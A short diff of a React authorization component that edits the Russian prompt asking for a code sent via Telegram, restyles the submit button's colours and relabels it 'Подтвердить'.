@@ -77,7 +77,8 @@ export default function Auth2() {
     <div className="min-h-screen font-sans scrollbar-hide overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
       <p className="text-4xl text-white">Авторизация</p>
       <p className="mt-3 text-lg text-gray-400">
-        Введите код, который вы получили в Telegram.
+        Мы отправили 5-значный код код в вао Telegram.
+        Пожалуйста, введите его ниже.
       </p>
 
       <div className="mt-7 flex space-x-3 justify-center">
@@ -103,9 +104,9 @@ export default function Auth2() {
       <button
         onClick={handleSubmitCode}
         disabled={code.some(digit => digit === "")}
-        className="mt-6 px-8 py-3 bg-blue-500 text-white text-lg font-semibold rounded-lg hover:bg-blue-600 disabled:bg-gray-600 disabled:cursor-not-allowed transition"
+        className="mt-6 px-8 py-3 bg-[#027ffe] text-white text-lg font-semibold rounded-lg hover:bg-[#026ee0] disabled:bg-gray-600 disabled:cursor-not-allowed transition"
       >
-        Отправить
+        Подтвердить
       </button>
     </div>
   );
